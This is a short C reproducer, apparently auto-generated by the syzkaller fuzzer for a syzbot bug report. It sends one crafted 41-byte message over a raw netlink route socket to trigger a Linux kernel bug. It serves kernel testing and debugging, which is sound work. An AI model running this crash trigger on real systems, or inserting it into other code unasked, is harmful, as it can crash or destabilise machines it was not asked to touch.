// https://syzkaller.appspot.com/bug?id=2ee2cb701295d82be29de9fa556f080bc9fa951f
// autogenerated by syzkaller (http://github.com/google/syzkaller)

#define _GNU_SOURCE
#include <endian.h>
#include <stdint.h>
#include <string.h>
#include <sys/syscall.h>
#include <unistd.h>

long r[1];
void loop()
{
  memset(r, -1, sizeof(r));
  syscall(__NR_mmap, 0x20000000, 0xfff000, 3, 0x32, -1, 0);
  r[0] = syscall(__NR_socket, 0x10, 3, 0);
  *(uint64_t*)0x200c1000 = 0x204db000;
  *(uint64_t*)0x200c1008 = 0x29;
  memcpy((void*)0x204db000, "\x29\x00\x00\x00\x18\x00\xff\x09\x00\x00\x00\x00"
                            "\x00\x00\x00\x02\x0a\x01\x00\x00\x09\x00\xef\x06"
                            "\x80\x08\x00\x00\x0d\x00\x09\x00\x09\x00\x00\x19"
                            "\x00\x00\x00\x00\xf6",
         41);
  syscall(__NR_writev, r[0], 0x200c1000, 1);
}

int main()
{
  loop();
  return 0;
}
